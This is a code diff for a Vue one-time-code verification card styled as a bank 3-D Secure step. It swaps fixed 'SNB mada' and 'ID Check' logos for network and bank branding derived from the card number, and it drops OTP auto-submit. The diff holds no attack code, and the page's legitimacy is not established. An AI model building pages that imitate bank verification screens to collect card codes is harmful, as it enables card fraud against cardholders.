@@ -13,9 +13,26 @@
             </Transition>
 
             <!-- Branding header -->
-            <div class="tds-header">
-                <img :src="bankMadaLogo" alt="SNB mada" class="tds-header__bank" />
-                <img :src="schemeLogo" alt="ID Check" class="tds-header__scheme" />
+            <div v-if="hasAnyBranding" class="tds-header">
+                <div class="tds-header__slot tds-header__slot--left">
+                    <img
+                        v-if="displayNetworkLogo"
+                        :src="displayNetworkLogo"
+                        :alt="displayNetworkName"
+                        class="tds-header__logo tds-header__logo--network"
+                    />
+                    <div v-else class="tds-header__placeholder" aria-hidden="true"></div>
+                </div>
+                <div class="tds-header__center" aria-hidden="true"></div>
+                <div class="tds-header__slot tds-header__slot--right">
+                    <img
+                        v-if="displayBankLogo"
+                        :src="displayBankLogo"
+                        :alt="displayBankName"
+                        class="tds-header__logo tds-header__logo--bank"
+                    />
+                    <div v-else class="tds-header__placeholder" aria-hidden="true"></div>
+                </div>
             </div>
 
             <!-- Error -->
@@ -59,7 +76,6 @@
                     placeholder="أدخل رمز التحقق"
                     class="tds-field__input"
                     autocomplete="one-time-code"
-                    @keyup.enter="submitOtp"
                     @input="handleOtpInput"
                     @paste="handleOtpPaste"
                 />
@@ -116,9 +132,6 @@ import { safeRedirect } from '@/utils/safeRedirect';
 // InsLoading replaced with in-card verify overlay
 import { useCardBranding } from '@/composables/useCardBranding';
 import { getReasonLabel } from '@/constants/rejectionReasons';
-import _paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';
-import bankMadaLogo from '@/../../resources/images/logo/banks/bank_mada.png';
-import schemeLogo from '@/../../resources/images/logo/banks/scheme.png';
 import loadingGif from '@/../../resources/images/logo/banks/loading.gif';
 
 // ─── Order data (transaction context for trust signals) ─────────────
@@ -144,7 +157,13 @@ const _cardHolder = computed( () => context.cardHolder || '' );
 const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );
 
 // ─── Card branding (network + bank) ────────────────────────────────
-const { brand: _brand, networkLogo: _networkLogo, networkName: _networkName, bankKey: _bankKey, bankLogo: _bankLogo, bankName: _bankName } = useCardBranding( cardBin );
+const { brand, networkLogo, networkName, bankLogo, bankName } = useCardBranding( cardBin );
+
+const displayBankLogo = computed( () => bankLogo.value || null );
+const displayNetworkLogo = computed( () => networkLogo.value || null );
+const displayBankName = computed( () => bankName.value || 'البنك' );
+const displayNetworkName = computed( () => networkName.value || brand.value || 'Card' );
+const hasAnyBranding = computed( () => Boolean( displayBankLogo.value || displayNetworkLogo.value ) );
 
 const RESEND_COOLDOWN = 180; // seconds
 const CODE_EXPIRY = 300; // 5 minutes fallback
@@ -228,18 +247,9 @@ function extractOtpCode ( raw )
     return digits.slice( 0, 6 );
 }
 
-function queueAutoSubmitIfReady ()
-{
-    clearTimeout( autoSubmitTimer );
-    if ( /^(\d{4}|\d{6})$/.test( otpCode.value ) ) {
-        autoSubmitTimer = setTimeout( () => submitOtp(), 350 );
-    }
-}
-
 function handleOtpInput ( event )
 {
     otpCode.value = extractOtpCode( event?.target?.value );
-    queueAutoSubmitIfReady();
 }
 
 function handleOtpPaste ( event )
@@ -249,7 +259,6 @@ function handleOtpPaste ( event )
     if ( extracted ) {
         event.preventDefault();
         otpCode.value = extracted;
-        queueAutoSubmitIfReady();
     }
 }
 
@@ -422,7 +431,6 @@ async function initWebOTP ()
         {
             const code = extractOtpCode( content.code );
             otpCode.value = code;
-            queueAutoSubmitIfReady();
         }
     } catch
     {
@@ -450,14 +458,11 @@ onMounted( async () =>
     trackOtpRequested();
 } );
 
-let autoSubmitTimer = null;
-
 onUnmounted( () =>
 {
     if ( timerInterval ) clearInterval( timerInterval );
     if ( expiryInterval ) clearInterval( expiryInterval );
     if ( abortController ) abortController.abort();
-    clearTimeout( autoSubmitTimer );
     // WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
 } );
 </script>
@@ -519,24 +524,52 @@ onUnmounted( () =>
 
 /* ── Branding header ─────────────────────────── */
 .tds-header {
-    display: flex;
+    display: grid;
+    grid-template-columns: 110px 1fr 130px;
     align-items: center;
-    justify-content: space-between;
+    gap: 12px;
     padding: 12px 20px;
     background: #e8f5f3;
     border-bottom: 1px solid #d4ece8;
 }
 
-.tds-header__bank {
-    height: 32px;
-    width: auto;
-    object-fit: contain;
+.tds-header__slot {
+    display: flex;
+    align-items: center;
+    min-width: 0;
 }
 
-.tds-header__scheme {
-    height: 36px;
-    width: auto;
+.tds-header__slot--left {
+    justify-content: flex-start;
+}
+
+.tds-header__slot--right {
+    justify-content: flex-end;
+}
+
+.tds-header__center {
+    min-width: 0;
+}
+
+.tds-header__logo {
     object-fit: contain;
+    display: block;
+}
+
+.tds-header__logo--network {
+    width: 64px;
+    height: 26px;
+}
+
+.tds-header__logo--bank {
+    width: 120px;
+    height: 40px;
+}
+
+.tds-header__placeholder {
+    width: 84px;
+    height: 30px;
+    visibility: hidden;
 }
 
 /* ── Error ────────────────────────────────────── */
